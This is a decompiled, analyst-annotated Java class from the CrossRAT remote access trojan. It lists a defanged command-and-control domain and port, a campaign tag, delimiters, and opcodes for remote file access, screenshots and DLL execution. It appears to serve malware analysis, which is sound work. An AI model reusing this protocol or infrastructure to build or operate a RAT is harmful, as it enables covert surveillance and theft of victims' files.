package crossrat;

import java.net.Socket;
import java.util.UUID;
import java.util.prefs.Preferences;

/* loaded from: hmar6.jar:crossrat/k.class */
public final class k {
    public static UUID f;
    public static String g;
    public static Preferences h;
    public static Socket k;
    public static Socket l;

    /* renamed from: K */
    public static String filepath_for_CrossRAT;

    /* renamed from: a */
    public static boolean f41a = false;

    /* renamed from: b */
    public static String C2_URL = "flexberry[.]com";

    /* renamed from: c */
    public static int C2_PORT = 2223;

    /* renamed from: d */
    public static String arg_delimit = "$#@";

    /* renamed from: e */
    public static String delimit_within_args = "^!@";

    /* renamed from: i */
    public static String version_num = "0.1";

    /* renamed from: j */
    public static String campaign_num = "GROUP2";
    // Start of C2 commands from Host to Victim

    /* renamed from: m */
    public static String enum_root_dir = "@0000";

    /* renamed from: n */
    public static String enum_files = "@0001";

    /* renamed from: o */
    public static String create_blank_file = "@0002";

    /* renamed from: p */
    public static String copy_file = "@0003";

    /* renamed from: q */
    public static String move_file = "@0004";

    /* renamed from: r */
    public static String write_file_contents = "@0005";

    /* renamed from: s */
    public static String read_file_contents = "@0006";

    /* renamed from: t */
    public static String status_request = "@0007";

    /* renamed from: u */
    public static String get_screenshot = "@0008";

    /* renamed from: v */
    public static String WIN_RUN_DLL = "@0009";
    // Start of Victim response to C2 infrastructure commands

    /* renamed from: w */
    public static String client_hello = "@0000";

    /* renamed from: x */
    public static String status_response = "@0001";

    /* renamed from: y */
    public static String list_root_dir = "@0002";

    /* renamed from: z */
    public static String unimplemented_1 = "@0003";

    /* renamed from: A */
    public static String unimplemented_2 = "@0004";

    /* renamed from: B */
    public static String start_list_files = "@0005";

    /* renamed from: C */
    public static String stop_list_files = "@0006";

    /* renamed from: D */
    public static String file_created_status = "@0007";

    /* renamed from: E */
    public static String file_written_status = "@0008";

    /* renamed from: F */
    public static String file_moved_status = "@0009";

    /* renamed from: G */
    public static String file_write_status = "@0010";

    /* renamed from: H */
    public static String file_read_status_and_contents = "@0011";

    /* renamed from: I */
    public static String send_screenshot_contents = "@0012";

    /* renamed from: J */
    public static String Run_DLL_Status = "@0013";
}
